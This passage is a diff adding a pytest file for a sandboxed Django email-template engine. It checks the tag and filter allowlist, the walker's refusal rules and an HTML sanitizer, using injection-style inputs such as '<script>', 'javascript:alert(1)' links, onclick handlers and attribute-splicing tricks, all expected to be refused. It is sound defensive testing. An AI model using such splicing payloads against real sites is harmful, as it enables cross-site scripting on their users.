@@ -1,0 +1,2212 @@
+"""Rendering message templates: the restricted engine, the walker, prepare(), the passes, preview and its read."""
+
+from __future__ import annotations
+
+import asyncio
+import datetime
+import inspect
+import logging
+import os
+import re
+import threading
+import time
+import zoneinfo
+from collections.abc import Callable, Iterable, Iterator
+from contextlib import contextmanager
+from decimal import Decimal
+from pathlib import Path
+from typing import Any
+
+import html5lib
+import markdown_it
+import pytest
+import yaml
+from asgiref.sync import sync_to_async
+from django.contrib.auth.models import AnonymousUser
+from django.core.exceptions import ValidationError
+from django.template import Engine, TemplateSyntaxError
+from django.template.base import DebugLexer, Node, Parser, tag_re
+from django.template.defaulttags import TemplateLiteral
+from django.utils import timezone, translation
+from django.utils.safestring import SafeString, mark_safe
+from hypothesis import HealthCheck, event, example, given, settings
+from hypothesis import strategies as st
+from markdown_it import MarkdownIt
+from markdown_it.helpers import parseLinkLabel
+from markdown_it.renderer import RendererHTML
+from markdown_it.rules_inline import StateInline
+from rebac import system_context
+
+from angee.base.models.identity import public_id_of
+from angee.brandkit.testing.models import BrandKit
+from angee.graphql.testing.documents import execute_schema, result_data
+from angee.messaging_templates import schema as messaging_templates_schema
+from angee.messaging_templates import walker as walker_module
+from angee.messaging_templates.engine import (
+    ALLOWED_FILTERS,
+    ALLOWED_TAGS,
+    RENDER_BUDGET,
+    MessageTemplateEngine,
+    RenderBudget,
+    RenderBudgetExceeded,
+    register,
+    url,
+)
+from angee.messaging_templates.html_checks import (
+    LINK_ATTRIBUTES,
+    MODE_ELEMENTS,
+    OUTPUT_ATTRIBUTES,
+    SpellingRule,
+    check_html,
+    compiled_expression,
+)
+from angee.messaging_templates.testing.models import MessageTemplate
+from angee.messaging_templates.walker import (
+    WALKED_NODES,
+    RowPiece,
+    TemplateWalk,
+    TemplateWalker,
+    TemplateWarning,
+    TemplateWarningCode,
+    _frame,
+    _RowRules,
+    _Tree,
+    _TreeWalker,
+    walked,
+)
+from tests.conftest import addon_schema, create_platform_admin, create_user
+
+ROOT = Path(__file__).resolve().parents[1]
+ANGEE: dict[str, Any] = {
+    name: value
+    for name, value in yaml.safe_load((ROOT / "src/angee/brandkit/resources/install/010_brandkit.brandkit.yaml")
+                                      .read_text())[0].items()
+    if name != "xref"
+}
+
+PLAIN_LAYOUT = (
+    '<html lang="{{ lang }}" dir="{{ dir }}"><head><title>{{ subject }}</title></head><body>'
+    '<div style="display:none">{{ preheader }}</div>{% block content %}{% endblock %}</body></html>'
+)
+PLAIN_TEXT = "{% block content %}{% endblock %}"
+
+_DEFAULTS: dict[str, dict[str, Any]] = {
+    "layout": {"format": "html", "source": PLAIN_LAYOUT, "text_source": PLAIN_TEXT},
+    "template": {"format": "markdown", "source": "Hello.", "subject": "A subject", "preheader": "A preheader",
+                 "layout": "plain"},
+    "block": {"format": "html", "source": "<p>Block</p>", "text_source": "Block"},
+    "part": {"format": "markdown", "source": "Part."},
+}
+
+
+def _unsaved(kind: str = "template", key: str = "tests.mail", language: str = "en", **values: Any) -> Any:
+    return MessageTemplate(kind=kind, key=key, language=language, **{"name": key, **_DEFAULTS[kind], **values})
+
+
+def _row(kind: str = "template", key: str = "tests.mail", language: str = "en", **values: Any) -> Any:
+    """Save a row as named system work, past ``clean``: what a render meets when a write skipped the walk."""
+
+    row = _unsaved(kind, key, language, **values)
+    with system_context(reason="tests.messaging_templates.render.setup"):
+        row.save()
+    return row
+
+
+def _refusals(row: Any, *, saving: bool = True) -> list[str]:
+    with system_context(reason="tests.messaging_templates.render.walk"):
+        try:
+            TemplateWalker(saving=saving).walk(row, MessageTemplate.objects)
+        except ValidationError as error:
+            return list(error.messages)
+    return []
+
+
+def _walk(row: Any) -> TemplateWalk:
+    with system_context(reason="tests.messaging_templates.render.walk"):
+        return TemplateWalker().walk(row, MessageTemplate.objects)
+
+
+def _render(row: Any, values: dict[str, Any], kit: Any = None) -> Any:
+    with system_context(reason="tests.messaging_templates.render"):
+        return row.render(values, kit=kit)
+
+
+@pytest.fixture
+def kit(db: None) -> Any:
+    del db
+    with system_context(reason="tests.messaging_templates.render.kit"):
+        return BrandKit.objects.create(**{**ANGEE, "name": "Acme", "is_default": True})
+
+
+@pytest.fixture
+def plain(kit: Any) -> Any:
+    """A minimal layout, the default kit beside it."""
+
+    del kit
+    return _row("layout", "plain")
+
+
+TIMED_RUN = os.environ.get("ANGEE_TIMED_TESTS") == "1"
+"""Whether CPU-time bounds are asserted: every one of them runs on request (docs/checks.md), never by default."""
+
+
+@contextmanager
+def _within(seconds: float, case: object = None) -> Iterator[None]:
+    """Time the block in CPU seconds; the bound is asserted only when ``ANGEE_TIMED_TESTS=1``, as every CPU bound is."""
+
+    started = time.process_time()
+    yield
+    spent = time.process_time() - started
+    assert not TIMED_RUN or spent < seconds, (case, f"{spent:.3f} s of CPU, over {seconds} s")
+
+
+def _mail(source: str, variables: dict[str, str] | None = None, **values: Any) -> Any:
+    return _row("template", values.pop("key", "tests.mail"), variables=variables or {}, source=source, **values)
+
+
+def _recording(monkeypatch: pytest.MonkeyPatch, owner: object, name: str, record: Callable[..., None]) -> None:
+    """Wrap ``owner.name`` so ``record`` sees each call's arguments before it runs."""
+
+    original = getattr(owner, name)
+
+    def recorded(*args: Any) -> Any:
+        record(*args)
+        return original(*args)
+
+    monkeypatch.setattr(owner, name, recorded)
+
+
+# ---------- the engine ----------
+
+T01_REFUSED = (
+    "{% load static %}", "{% debug %}", "{% url 'x' %}", "{% csrf_token %}", "{% autoescape off %}x{% endautoescape %}",
+    "{% now 'Y' %}", "{% lorem %}", "{% filter upper %}x{% endfilter %}", "{% cycle 'a' 'b' %}", "{% firstof a b %}",
+    "{% widthratio a b 100 %}", "{% spaceless %}x{% endspaceless %}", "{% verbatim %}{{ x }}{% endverbatim %}",
+    "{% regroup a by b as c %}", "{% ifchanged %}x{% endifchanged %}", "{% querystring %}",
+    "{% partialdef p %}x{% endpartialdef %}", "{% partial p %}", "{% csp_nonce_attr %}", "{% resetcycle %}",
+    "{% translate 'x' %}", "{% blocktranslate %}x{% endblocktranslate %}",
+    "{{ x|safe }}", "{{ x|safeseq }}", "{{ x|escapejs }}", "{{ x|add:'1' }}", "{{ x|stringformat:'s' }}",
+    "{{ x|urlize }}", "{{ x|ljust:'9' }}", "{{ x|cut:'a' }}", "{{ x|json_script:'i' }}", "{{ x|dictsort:'a' }}",
+    "{{ x|random }}", "{{ x|wordwrap:5 }}", "{{ x|escape }}", "{{ x|force_escape }}", "{{ x|striptags }}",
+    "{{ x|timesince }}", "{{ x|join:',' }}", "{{ x|first }}", "{{ x|last }}", "{{ x|default_if_none:'a' }}",
+    "{% include name only %}", "{% include 'blocks/x' %}", "{% extends name %}", "{% include 'a'|lower only %}",
+)
+
+
+def test_the_engine_registers_exactly_the_allowlist_and_compiles_nothing_else() -> None:
+    engine = MessageTemplateEngine(autoescape=True)
+    parser = Parser([], engine.template_libraries, engine.template_builtins)
+    assert sorted(parser.tags) == sorted(ALLOWED_TAGS)
+    assert sorted(parser.filters) == sorted(ALLOWED_FILTERS)
+    assert engine.template_libraries == {}
+    assert engine.context_processors == []
+    for source in T01_REFUSED:
+        with pytest.raises(TemplateSyntaxError):
+            engine.from_string(source)
+
+
+GUARD_TEMPLATE = (
+    '<p>{% include "parts/guard" with who=person.name only %}'
+    "{% if count > 1 and flag or not flag %}a{% elif name == 'x' %}b{% elif count >= 2 %}{% elif count < 3 %}"
+    "{% elif count <= 4 %}{% elif count != 5 %}{% elif name in 'abc' %}{% elif name not in 'abc' %}"
+    "{% elif flag is True %}{% elif flag is not None %}{% elif ratio == 1.5 %}{% elif flag == False %}c"
+    "{% elif items|length %}{% else %}d{% endif %}</p>\n"
+    "<p>{% for item in items reversed %}{{ forloop.counter }}{{ item.label|default:'x'|upper|lower|capfirst }}"
+    "{% empty %}none{% endfor %}{% with title=name|title %}{{ title|truncatechars:5 }}{% endwith %}"
+    "{# a note #}{% comment %}x{% endcomment %}{% templatetag openvariable %}</p>\n"
+    "<p>{{ note|truncatewords:2|linebreaksbr }}{{ items|length }}{{ when|date:'DATE_FORMAT' }}"
+    "{{ amount|floatformat:2 }}{{ count|pluralize }}{{ flag|yesno:'y,n' }}<a href=\"{{ link|url }}\">x</a></p>"
+)
+GUARD_VARIABLES = {
+    "person.name": "x", "count": "x", "flag": "x", "name": "x", "ratio": "x", "items.*.label": "x", "note": "x",
+    "when": "x", "amount": "x", "link": "x",
+}
+GUARD_NODES = {
+    "TextNode": ((), ["s"]),
+    "VariableNode": ((), ["filter_expression"]),
+    "IfNode": (("nodelist",), ["conditions_nodelists"]),
+    "ForNode": (("nodelist_loop", "nodelist_empty"),
+                ["is_reversed", "loopvars", "nodelist_empty", "nodelist_loop", "sequence"]),
+    "BudgetedLoopBody": (("nodelist",), ["nodelist"]),
+    "WithNode": (("nodelist",), ["extra_context", "nodelist"]),
+    "CommentNode": ((), []),
+    "BudgetedIncludeNode": (("nodelist",), ["extra_context", "isolated_context", "template"]),
+    "ExtendsNode": (("nodelist",), ["blocks", "nodelist", "parent_name", "template_dirs"]),
+    "BlockNode": (("nodelist",), ["name", "nodelist", "parent"]),
+    "TemplateTagNode": (("nodelist",), ["tagtype"]),
+}
+GUARD_FILTERS = {
+    "capfirst": ((True, None, None), "(value)"),
+    "date": ((False, None, True), "(value, arg=None)"),
+    "default": ((False, None, None), "(value, arg)"),
+    "floatformat": ((True, None, None), "(text, arg=-1)"),
+    "length": ((False, None, None), "(value)"),
+    "linebreaksbr": ((True, True, None), "(value, autoescape=True)"),
+    "lower": ((True, None, None), "(value)"),
+    "pluralize": ((False, None, None), "(value, arg='s')"),
+    "title": ((True, None, None), "(value)"),
+    "truncatechars": ((True, None, None), "(value, arg)"),
+    "truncatewords": ((True, None, None), "(value, arg)"),
+    "upper": ((False, None, None), "(value)"),
+    "url": ((False, None, None), "(value: 'Any') -> 'str'"),
+    "yesno": ((False, None, None), "(value, arg=None)"),
+}
+
+
+def test_walker_reads_every_node(plain: Any, kit: Any) -> None:
+    """The guard every Django upgrade runs: the nodes, attributes, operators, filters and lexer the walker reads."""
+
+    del plain
+    _row("block", "guard", source="<b>{{ who }}{{ brand.name }}{{ lang }}</b>", text_source="{{ who }}",
+         variables={"who": "x"})
+    _row("part", "guard", source='{% include "blocks/guard" with who=who only %}', variables={"who": "x"})
+    template = _mail(GUARD_TEMPLATE, GUARD_VARIABLES, format="html", text_source="{{ name }}")
+    walk = _walk(template)
+    engines = {"html": MessageTemplateEngine(autoescape=True), "text": MessageTemplateEngine(autoescape=False)}
+    met: dict[str, tuple[tuple[str, ...], list[str]]] = {}
+    operators: set[str] = set()
+
+    def conditions(condition: Any) -> None:
+        operators.add(condition.id)
+        if type(condition) is not TemplateLiteral:
+            for operand in (condition.first, condition.second):
+                if operand is not None:
+                    conditions(operand)
+
+    for forms in walk.forms.values():
+        for form, engine in engines.items():
+            for node in engine.from_string(getattr(forms, form)).nodelist.get_nodes_by_type(Node):
+                met[type(node).__name__] = (
+                    type(node).child_nodelists, sorted(set(vars(node)) - {"token", "origin"}),
+                )
+                # The walker's table renders what Django renders under each node.
+                assert [child for nodelist in walked(node).nodelists(node) for child in nodelist] == [
+                    child for name in type(node).child_nodelists for child in getattr(node, name, None) or ()
+                ], type(node)
+                for condition, _ in getattr(node, "conditions_nodelists", ()):
+                    if condition is not None:
+                        conditions(condition)
+    assert met == GUARD_NODES
+    assert set(GUARD_NODES) == {node.__name__ for node in WALKED_NODES}
+    assert operators == {"or", "and", "not", "in", "not in", "is", "is not", "==", "!=", ">", ">=", "<", "<=",
+                         "literal"}
+    assert {
+        name: (tuple(getattr(function, flag, None) for flag in ("is_safe", "needs_autoescape", "expects_localtime")),
+               str(inspect.signature(inspect.unwrap(function))))
+        for name, function in register.filters.items()
+    } == GUARD_FILTERS
+    assert tag_re.pattern == r"({%.*?%}|{{.*?}}|{#.*?#})"
+    assert [(token.token_type.name, token.position) for token in DebugLexer(
+        "Hi {{ a }}{% if b %}c{% endif %}{# d #}").tokenize()] == [
+        ("TEXT", (0, 3)), ("VAR", (3, 10)), ("BLOCK", (10, 20)), ("TEXT", (20, 21)), ("BLOCK", (21, 32)),
+        ("COMMENT", (32, 39)),
+    ]
+    # An include inside an included row still reads the globals: new() reads them from the copy of the context.
+    rendered = _render(template, {"person": {"name": "Ana"}, "count": 2, "flag": True, "name": "x", "ratio": 1.5,
+                                  "items": [{"label": "a"}], "note": "n", "when": "2026-11-24", "amount": "3.14159",
+                                  "link": "https://example.test/"}, kit)
+    assert "<b>AnaAcmeen</b>" in rendered.html and "{{" in rendered.html
+    # Another node class is a defect to fix in the walker, never a refusal.
+    spaceless = Engine().from_string("{% spaceless %}x{% endspaceless %}").nodelist[0]
+    with pytest.raises(TypeError, match="does not know SpacelessNode"):
+        _RowRules([], "probe", text_form=False).node(spaceless)
+    tree_walker = _TreeWalker(walk, {})
+    with pytest.raises(TypeError, match="does not know SpacelessNode"):
+        tree_walker.node(_frame("probe", template, RowPiece.HTML, top=True), spaceless, _Tree(RowPiece.HTML))
+
+
+# ---------- the walker's refusals, one rule at a time ----------
+
+LONG = "a" * 1_001
+
+
+@pytest.mark.parametrize(
+    ("values", "refusal"),
+    [
+        pytest.param({"source": "x" * 50_001}, "source is over 50000 characters", id="1-source-size"),
+        pytest.param({"source": LONG}, "a line of source is over 1000", id="1-line-length"),
+        pytest.param({"source": "{{ a }}" * 31, "variables": {"a": "x"}}, "or holds over 30", id="1-line-openers"),
+        pytest.param({"source": "[" * 31}, "holds over 30 [", id="1-markdown-brackets"),
+        pytest.param({"source": ("&#123;&#123;" * 83)[:999]}, "html form holds over 60", id="1-form-openers"),
+        pytest.param({"source": "\n".join(["{% if a %}"] * 17) + "\n" + "\n".join(["{% endif %}"] * 17),
+                      "variables": {"a": "x"}}, "nests tags over 16 deep", id="2-nesting"),
+        pytest.param({"source": "{% if %}{% endif %}"}, "does not compile", id="3-compile"),
+        pytest.param({"source": '{{ "<b>" }}'}, "holds <, > or", id="4-literal-markup"),
+        pytest.param({"source": '{{ "' + "a" * 201 + '" }}'}, "a literal over 200", id="4-literal-length"),
+        pytest.param({"source": '{{ _("Hi") }}'}, "_(…)", id="4-translation"),
+        pytest.param({"source": "{{ a|truncatechars:n }}", "variables": {"a": "x", "n": "x"}},
+                     "takes a literal argument", id="5-variable-argument"),
+        pytest.param({"source": "{{ a|lower|upper|lower|upper|lower }}", "variables": {"a": "x"}},
+                     "over 4 filters", id="5-filter-count"),
+        pytest.param({"source": "{{ a|floatformat:7 }}", "variables": {"a": "x"}}, "precision 7", id="5-precision"),
+        pytest.param({"source": "{{ a|date:'rrrrrrrrrrrrrrrrrrrrr' }}", "variables": {"a": "x"}},
+                     "a date format", id="5-date-format"),
+        pytest.param({"source": "{{ a|upper|date }}", "variables": {"a": "x"}}, "date is the first", id="5-date-first"),
+        pytest.param({"source": "{{ a|url|upper }}", "variables": {"a": "x"}}, "url is the last", id="5-url-last"),
+        pytest.param({"source": "{{ a|upper|url }}", "variables": {"a": "x"}}, "url is the last", id="5-url-after"),
+        pytest.param({"source": "{{ order|upper }}", "variables": {"order.total": "x"}},
+                     "filters an object or a list", id="5-container-filter"),
+        pytest.param({"source": "{{ a|linebreaksbr:'x' }}", "variables": {"a": "x"}, "format": "html",
+                      "text_source": "x"}, "linebreaksbr takes no argument", id="5-linebreaksbr-argument"),
+        pytest.param({"source": "a {{ b", "format": "html", "text_source": "x"}, "text holds {{", id="6-text-opener"),
+        pytest.param({"source": "<p>{{ a }}</p>", "format": "html", "text_source": "{{ a|linebreaksbr }}",
+                      "variables": {"a": "x"}}, "writes <br> into plain text", id="7-linebreaksbr-text"),
+        pytest.param({"source": "Hi{% endblock %}{% block x %}X"}, "a template writes neither", id="8-author-block"),
+        pytest.param({"subject": '{% include "parts/x" only %}'}, "not used in a subject", id="8-subject-include"),
+        pytest.param({"source": '{% include "layouts/plain" only %}'}, "only blocks and parts", id="9-include-kind"),
+        pytest.param({"source": '{% include "blocks/missing" only %}'}, "no message template blocks/missing",
+                     id="9-missing-row"),
+        pytest.param({"source": "{% for a, b in items %}{% endfor %}", "variables": {"items.*": "x"}},
+                     "one loop variable", id="10-loop-variables"),
+        pytest.param({"source": "{% for a in items|lower %}{% endfor %}", "variables": {"items.*": "x"}},
+                     "not a filtered one", id="10-filtered-sequence"),
+        pytest.param({"source": "{% for a in order %}{% endfor %}", "variables": {"order.total": "x"}},
+                     "for loops over a list", id="10-object-sequence"),
+        pytest.param({"source": "{% if a|upper %}{% endif %}", "variables": {"a": "x"}}, "an if tests",
+                     id="11-filtered-operand"),
+        pytest.param({"source": "{% if order %}{% endif %}", "variables": {"order.total": "x"}}, "an if tests",
+                     id="11-container-operand"),
+        pytest.param({"source": "{% if a in items %}{% endif %}", "variables": {"a": "x", "items.*": "x"}},
+                     "in takes a literal", id="11-in-value"),
+        pytest.param({"source": "<script>x</script>", "format": "html", "text_source": "x"},
+                     "changes how a reader reads what follows", id="12-html"),
+        pytest.param({"source": "Use `{{ a }}` here.", "variables": {"a": "x"}}, "inside Markdown code inline",
+                     id="12-markdown"),
+        pytest.param({"source": "{{ secret }}"}, "secret is not in its variables", id="13-undeclared"),
+        pytest.param({"source": "{{ forloop.counter }}"}, "outside a loop", id="13-forloop-outside"),
+        pytest.param({"source": "{% for i in items %}{{ forloop.parentloop }}{% endfor %}",
+                      "variables": {"items.*": "x"}}, "forloop.parentloop is not a value", id="13-forloop-key"),
+        pytest.param({"source": "{% for i in items %}{{ forloop }}{% endfor %}", "variables": {"items.*": "x"}},
+                     "prints an object or a list", id="13-forloop-bare"),
+        pytest.param({"source": "{{ brand.secret }}"}, "brand.secret is not a value", id="13-brand"),
+        pytest.param({"source": "{% with b=brand.light %}{{ b.nothing }}{% endwith %}"},
+                     "brand.light.nothing is not a value", id="13-brand-alias"),
+        pytest.param({"source": "{{ lang.code }}"}, "looks up inside lang", id="13-global-lookup"),
+        pytest.param({"source": "{{ True.real }}"}, "looks up inside True", id="13-constant-lookup"),
+        pytest.param({"source": "{{ block.super }}"}, "the engine's own", id="13-block"),
+        pytest.param({"source": "{{ name.upper }}", "variables": {"name": "x"}}, "name.upper is not in its",
+                     id="15-below-leaf"),
+        pytest.param({"source": "{% with a='x' %}{{ a.b }}{% endwith %}"}, "looks up inside a", id="15-literal"),
+        pytest.param({"source": "{% with a=n|lower %}{{ a.b }}{% endwith %}", "variables": {"n": "x"}},
+                     "looks up inside a", id="15-computed"),
+        pytest.param({"source": "{{ order }}", "variables": {"order.total": "x"}}, "prints an object or a list",
+                     id="16-container-output"),
+        pytest.param({"source": "{% with brand=a %}{% endwith %}", "variables": {"a": "x"}},
+                     "brand is a name the mail", id="18-reserved"),
+        pytest.param({"source": "{% with True=a %}{% endwith %}", "variables": {"a": "x"}},
+                     "True is a name the mail", id="18-constant"),
+        pytest.param({"source": "{% for lang in items %}{% endfor %}", "variables": {"items.*": "x"}},
+                     "lang is a name the mail", id="18-loop-variable"),
+        pytest.param({"source": "{% for i in items %}{% for j in items %}{% for k in items %}{% endfor %}{% endfor %}"
+                                "{% endfor %}", "variables": {"items.*": "x"}}, "loops nest over 2",
+                     id="18-loop-depth"),
+        pytest.param({"source": "\n".join(["{{ a }}" * 25] * 13), "format": "html", "text_source": "x",
+                      "variables": {"a": "x"}}, "over 300 outputs", id="18-outputs"),
+    ],
+)
+def test_the_walker_refuses_each_rule(plain: Any, values: dict[str, Any], refusal: str) -> None:
+    del plain
+    refusals = _refusals(_unsaved(**values))
+    assert any(refusal in message for message in refusals), refusals
+
+
+def test_a_walk_refuses_through_what_a_template_reaches(plain: Any) -> None:
+    """Rules 14, 17 and 18: effective paths, arguments, cycles and the depth of includes and rows."""
+
+    del plain
+    _row("part", "named", source="{{ person.first_name }} {{ person.last_name|default:'' }}",
+         variables={"person.first_name": "x", "person.last_name": "x"})
+    _row("part", "loops", source="{% include \"parts/loops\" only %}")
+    _row("part", "leaks", source="{{ secret }}", variables={"secret": "x"})
+    _row("part", "one", source='{% include "parts/two" only %}')
+    _row("part", "two", source='{% include "parts/three" only %}')
+    _row("part", "three", source='{% include "parts/four" only %}')
+    _row("part", "four", source="Four.")
+    cases = {
+        "14-effective": ('{% include "parts/named" with person=recipient only %}', {"recipient.first_name": "x"},
+                         "recipient.last_name is not a value the render declares"),
+        "17-undeclared-argument": ('{% include "parts/named" with person=recipient other=recipient only %}',
+                                   {"recipient.first_name": "x", "recipient.last_name": "x"},
+                                   "passes other to parts/named"),
+        "17-not-passed": ('{% include "parts/leaks" only %}', {}, "which it was not passed"),
+        "18-cycle": ('{% include "parts/loops" only %}', {}, "includes itself"),
+        "18-include-depth": ('{% include "parts/one" only %}', {}, "includes nest over 3"),
+    }
+    for case, (source, variables, refusal) in cases.items():
+        refusals = _refusals(_unsaved(source=source, variables=variables))
+        assert any(refusal in message for message in refusals), (case, refusals)
+    assert _refusals(_unsaved(source='{% include "parts/two" only %}')) == []
+
+
+def test_saving_asks_every_included_key_to_resolve_and_a_render_asks_only_for_a_row(plain: Any) -> None:
+    del plain
+    _row("part", "local", language="es", source="Hola.")
+    template = _unsaved(language="es", source='{% include "parts/local" only %}')
+    assert any("parts/local has no shipped default" in message for message in _refusals(template, saving=True))
+    assert _refusals(template, saving=False) == []
+
+
+def test_a_saved_layout_block_or_part_walks_what_it_reaches_and_clean_walks_only_what_changed(plain: Any) -> None:
+    template = _mail('{% include "parts/fine" only %}', key="tests.edit")
+    part = _row("part", "fine", source="Fine.")
+    with system_context(reason="tests.messaging_templates.render.edit"):
+        part.source = "{% if %}"
+        with pytest.raises(ValidationError, match="does not compile"):
+            part.full_clean()
+        part.save()  # past clean: the part is broken now
+        template.name = "Renamed"
+        template.full_clean()  # what renders did not change, so the walk does not run
+        template.source = '{% include "parts/fine" only %}\n\nMore.'
+        with pytest.raises(ValidationError, match="parts/fine"):
+            template.full_clean()
+        plain.description = "Plain."
+        plain.full_clean()
+
+
+# ---------- the HTML checks ----------
+
+HTML_ENGINE = MessageTemplateEngine(autoescape=True)
+
+
+@pytest.mark.parametrize(
+    ("html", "refused"),
+    [
+        *(pytest.param(f"<{tag}></{tag}>", True, id=f"element-{tag}")
+          for tag in ("script", "iframe", "object", "embed", "form", "link", "base", "svg", "math")),
+        pytest.param('<meta http-equiv="refresh" content="0">', True, id="http-equiv"),
+        pytest.param('<p onclick="x">x</p>', True, id="on-attribute"),
+        *(pytest.param(f'<img {name}="x">', True, id=f"attribute-{name}")
+          for name in ("srcset", "formaction", "xlink:href", "ping", "longdesc", "usemap", "data", "icon")),
+        *(pytest.param(f"<p>a</p><{tag}>b</{tag}>", True, id=f"s3-{tag}")
+          for tag in ("noscript", "xmp", "noembed", "noframes", "plaintext", "textarea")),
+        pytest.param('<noscript><p title="</noscript><b title={{ a }}>"></p></noscript>', True,
+                     id="s3-noscript-splice"),
+        pytest.param('<xmp><p title="</xmp><b title={{ a }}>"></p></xmp>', True, id="s3-xmp-splice"),
+        pytest.param('<span title="a" title={{ a }}>x</span>', True, id="s1-repeated-name-unquoted"),
+        pytest.param('<span title="a" title="{{ a }}">x</span>', True, id="s1-repeated-name"),
+        pytest.param('<span TITLE="a" title={{ a }}>x</span>', True, id="s1-repeated-name-in-capitals"),
+        pytest.param('<a href="https://example.test/" href={{ a|url }}>x</a>', True, id="s1-repeated-href"),
+        pytest.param('<p TITLE="{{ a }}">x</p>', False, id="s1-capital-name"),
+        pytest.param('<p title = "{{ a }}">x</p>', True, id="s1-spaced-equals"),
+        pytest.param('<p title="{{ a }}" >x</p>', True, id="s1-space-before-close"),
+        pytest.param('<a\nhref="https://example.test/"\ntitle="{{ a }}">x</a>', False, id="s1-newlines"),
+        pytest.param('<p title="a&b {{ a }}">x</p>', True, id="s1-bare-ampersand"),
+        pytest.param('<p title="a &amp; b {{ a }}">x</p>', False, id="s1-admitted-escaped"),
+        pytest.param('<img alt="{{ a }}" src="https://example.test/a.png" />', False, id="s1-admitted-self-closing"),
+        pytest.param('<td nowrap title="{{ a }}">x</td>', False, id="s1-admitted-bare-attribute"),
+        pytest.param("<title>{% include 'parts/p' only %}</title>", True, id="title-element-include"),
+        pytest.param("<title>{% for a in b %}{{ a }}{% endfor %}</title>", True, id="title-element-for"),
+        pytest.param("<title>{{ subject }}{% if a %} {{ a }}{% endif %}</title>", False, id="admitted-title-element"),
+        pytest.param("<{{ tag }}>x</{{ tag }}>", True, id="span-starts-a-tag"),
+        pytest.param("<a{{ tag }}>x</a>", True, id="span-in-a-tag-name"),
+        pytest.param('<p {{ name }}="x">x</p>', True, id="span-in-an-attribute-name"),
+        pytest.param("<p title={{ a }}>x</p>", True, id="unquoted"),
+        pytest.param("<p title='{{ a }}'>x</p>", True, id="single-quoted"),
+        pytest.param("<!-- note -->", True, id="comment"),
+        pytest.param("<!--[if mso]><b>x</b><![endif]-->", True, id="conditional-comment-outside-a-layout"),
+        pytest.param("<xml><o:OfficeDocumentSettings></o:OfficeDocumentSettings></xml>", True, id="office-outside"),
+        pytest.param("<v:rect></v:rect>", True, id="vml"),
+        pytest.param('<a href="{{ a|url }}{{ b|url }}">x</a>', True, id="href-two-outputs"),
+        pytest.param('<a href="{{ a }}">x</a>', True, id="href-without-url"),
+        pytest.param('<a href="https://x.test/{{ a|url }}">x</a>', True, id="href-text-and-output"),
+        pytest.param('<a href="javascript:alert(1)">x</a>', True, id="href-javascript"),
+        pytest.param('<img src="data:image/png;base64,AAAA">', True, id="src-data"),
+        pytest.param('<p style="color:{{ a }}">x</p>', True, id="style-value"),
+        pytest.param('<p style="color:{{ brand.light.text|upper }}">x</p>', True, id="style-filter"),
+        pytest.param('<p style="font:{{ brand.name }}">x</p>', True, id="style-brand-name"),
+        pytest.param("<style>a{color:{{ brand.font.body }}}</style>", True, id="style-element-font"),
+        pytest.param('<p class="{{ a }}">x</p>', True, id="class-output"),
+        pytest.param('<p title="{% for a in b %}{% endfor %}">x</p>', True, id="title-for"),
+        pytest.param('<p title="{% if a %}">x</p><b title="{% endif %}">y</b>', True, id="if-splice"),
+        pytest.param("<?php x ?>", True, id="processing-instruction"),
+        pytest.param('<a href="{{ a|url }}" title="{{ a }}">x</a>', False, id="admitted-link"),
+        pytest.param('<a href="{{ a|default:\'\'|url }}">x</a>', False, id="admitted-default-url"),
+        pytest.param('<a href="https://example.test/">x</a>', False, id="admitted-static-link"),
+        pytest.param('<p style="color:{{ brand.light.text }};font:16px {{ brand.font.body }};direction:{{ dir }}">'
+                     "x</p>", False, id="admitted-style"),
+        pytest.param("<style>.x{color:{{ brand.dark.text }}}</style>", False, id="admitted-style-element"),
+        pytest.param('<p title="{% if a %}{{ a }}{% else %}b{% endif %}" lang="{{ lang }}">x</p>', False,
+                     id="admitted-condition"),
+        pytest.param('<td style="text-align:{% if dir == \'rtl\' %}right{% else %}left{% endif %}">x</td>', False,
+                     id="admitted-style-condition"),
+        pytest.param("<!doctype html><html><body>{{ a }}</body></html>", True, id="doctype-outside-a-layout"),
+    ],
+)
+def test_the_html_checks(html: str, refused: bool) -> None:
+    assert bool(check_html(html, compiled_expression(HTML_ENGINE))) is refused, check_html(
+        html, compiled_expression(HTML_ENGINE))
+
+
+R = SpellingRule
+SPELLING_REFUSED: list[tuple[SpellingRule, str, bool]] = [
+    (R.NO_NUL, "<p>a\x00b</p>", False),
+    (R.NO_NUL, '<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ name }}">y</p>', False),
+    (R.NO_NUL, '<p title="\x009\x00">x</p>', False),
+    (R.LESS_THAN, "<p>5 < 6</p>", False),
+    (R.LESS_THAN, "<p>x</p></><p>y</p>", False),
+    (R.LESS_THAN, "<title>a<b</title>", False),
+    (R.LESS_THAN, "<style>a<b{}</style>", False),
+    (R.LESS_THAN, '<p title="a<b">x</p>', False),
+    (R.LESS_THAN, "<p>x</p><!-- note -->", False),
+    (R.LESS_THAN, "<!doctype html><p>x</p>", False),
+    (R.LESS_THAN, "<p>x</p><!doctype html>", True),
+    (R.LESS_THAN, "<?php x ?>", False),
+    (R.LESS_THAN, "<![CDATA[x]]>", False),
+    (R.LESS_THAN, "<!x>", False),
+    (R.LESS_THAN, "</ x>", False),
+    (R.LESS_THAN, "<p>5 <", False),
+    (R.START_TAG, "<p title='x'>y</p>", False),
+    (R.START_TAG, "<p title=x>y</p>", False),
+    (R.START_TAG, '<p title="a" title="b">y</p>', False),
+    (R.START_TAG, '<p title="a" TITLE="b">y</p>', False),
+    (R.START_TAG, '<p title = "x">y</p>', False),
+    (R.START_TAG, '<p title="x" >y</p>', False),
+    (R.START_TAG, '<p\x0ctitle="x">y</p>', False),
+    (R.START_TAG, '<p\x0btitle="x">y</p>', False),
+    (R.START_TAG, '<p title="a&b">y</p>', False),
+    (R.START_TAG, '<p title="x"title="y">z</p>', False),
+    (R.START_TAG, '<p/title="x">y</p>', False),
+    *((R.SELF_CLOSING, opening, False)
+      for opening in ("<style/>", "<style />", "<STYLE/>", '<style media="all"/>', "<title/>", "<p/>",
+                      '<a href="https://example.test/" />')),
+    (R.END_TAG, "<p>x</p >", False),
+    (R.END_TAG, '<p>x</p x="y">', False),
+    (R.END_TAG, "<p>x</p/>", False),
+    (R.END_TAG, "<title>x</title\t>", False),
+    (R.TEMPLATE_CODE, "<{{ tag }}>x", False),
+    (R.TEMPLATE_CODE, "<a{{ x }}>x</a>", False),
+    (R.TEMPLATE_CODE, '<p {{ x }}="y">z</p>', False),
+    (R.TEMPLATE_CODE, "<p>x</p{{ x }}>", False),
+    (R.TEMPLATE_CODE, "<title>Hi</title{{ v }}><p>x</p></title>", False),
+    (R.TEMPLATE_CODE, "<!--{{ x }}-->", True),
